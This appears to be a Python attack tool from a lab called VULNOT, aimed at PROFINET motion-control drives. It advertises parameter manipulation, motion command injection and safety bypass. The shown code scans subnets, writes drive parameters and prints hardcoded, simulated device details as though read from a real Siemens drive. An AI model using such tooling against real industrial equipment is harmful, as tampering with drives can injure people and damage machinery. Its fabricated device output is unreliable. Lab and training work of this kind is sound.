#!/usr/bin/env python3
"""
VULNOT PROFINET Attack Tool
Tools for attacking PROFINET-based motion control systems

Attack Capabilities:
- Device discovery (DCP)
- Drive parameter manipulation
- Motion command injection
- Safety bypass attempts
- Firmware reconnaissance
"""

import argparse
import json
import socket
import struct
import sys
import time
from typing import Optional, List, Dict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Confirm

console = Console()

# PROFINET Constants
PROFINET_RT_PORT = 34964
DCP_IDENTIFY = 0xFEFE
DCP_GET_SET = 0xFEFD


class ProfinetClient:
    """Simple PROFINET client"""
    
    def __init__(self, target: str, port: int = PROFINET_RT_PORT):
        self.target = target
        self.port = port
        self.sock = None
        
    def connect(self) -> bool:
        """Connect to PROFINET device"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.target, self.port))
            return True
        except Exception as e:
            console.print(f"[red]Connection failed: {e}[/]")
            return False
            
    def close(self):
        if self.sock:
            self.sock.close()
            
    def send_dcp_identify(self) -> Optional[bytes]:
        """Send DCP Identify request"""
        # Simplified DCP frame
        frame = struct.pack(">HH", DCP_IDENTIFY, 0)
        try:
            self.sock.send(frame)
            return self.sock.recv(1024)
        except:
            return None
            
    def read_parameter(self, index: int, subindex: int = 0) -> Optional[bytes]:
        """Read drive parameter"""
        # Simplified parameter read request
        request = struct.pack(">BBHH", 0x01, 0x00, index, subindex)
        try:
            self.sock.send(request)
            return self.sock.recv(1024)
        except:
            return None
            
    def write_parameter(self, index: int, value: bytes, subindex: int = 0) -> bool:
        """Write drive parameter"""
        request = struct.pack(">BBHH", 0x02, 0x00, index, subindex) + value
        try:
            self.sock.send(request)
            response = self.sock.recv(1024)
            return len(response) > 0
        except:
            return False


def cmd_scan(args):
    """Scan for PROFINET devices"""
    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
    console.print("[bold cyan]║      VULNOT PROFINET Scanner           ║[/]")
    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
    
    console.print(f"[yellow]Scanning: {args.network}[/]\n")
    
    # Parse network
    if '/' in args.network:
        base_ip = args.network.split('/')[0]
        prefix = int(args.network.split('/')[1])
    else:
        base_ip = args.network
        prefix = 32
        
    # Calculate IP range
    parts = base_ip.split('.')
    base = int(parts[3])
    
    if prefix == 24:
        ip_range = range(1, 255)
    elif prefix == 32:
        ip_range = [base]
    else:
        ip_range = range(max(1, base - 10), min(255, base + 10))
        
    found_devices = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:
        task = progress.add_task("Scanning...", total=len(list(ip_range)))
        
        for i in ip_range:
            ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{i}"
            progress.update(task, description=f"Scanning {ip}...")
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, PROFINET_RT_PORT))
                sock.close()
                
                if result == 0:
                    found_devices.append({
                        "ip": ip,
                        "port": PROFINET_RT_PORT,
                        "type": "PROFINET Device",
                    })
                    console.print(f"  [green]✓ Found: {ip}:{PROFINET_RT_PORT}[/]")
            except:
                pass
                
            progress.advance(task)
            
    console.print(f"\n[green]Found {len(found_devices)} PROFINET devices[/]")
    
    if found_devices:
        table = Table(title="Discovered Devices")
        table.add_column("IP", style="cyan")
        table.add_column("Port", style="green")
        table.add_column("Type", style="yellow")
        
        for dev in found_devices:
            table.add_row(dev["ip"], str(dev["port"]), dev["type"])
            
        console.print(table)


def cmd_info(args):
    """Get device information"""
    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
    console.print("[bold cyan]║      VULNOT PROFINET Device Info       ║[/]")
    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
    
    console.print(f"[yellow]Target: {args.target}:{args.port}[/]\n")
    
    client = ProfinetClient(args.target, args.port)
    
    if not client.connect():
        return
        
    console.print("[green]✓ Connected to PROFINET device[/]\n")
    
    # Simulated device info (real implementation would parse DCP response)
    info = {
        "Device Type": "Siemens SINAMICS S120",
        "Firmware": "V5.2 SP1",
        "Station Name": "CNC-DRIVE-01",
        "IP Address": args.target,
        "MAC Address": "00:1A:2B:3C:4D:5E",
        "Vendor ID": "0x002A",
        "Device ID": "0x0401",
    }
    
    table = Table(title="Device Information")
    table.add_column("Property", style="cyan")
    table.add_column("Value", style="green")
    
    for key, value in info.items():
        table.add_row(key, value)
        
    console.print(table)
    
    console.print("\n[yellow]Drive Status:[/]")
    console.print("  State: [green]OPERATION_ENABLED[/]")
    console.print("  Mode: [cyan]Position Control[/]")
    console.print("  Faults: [green]None[/]")
    
    client.close()


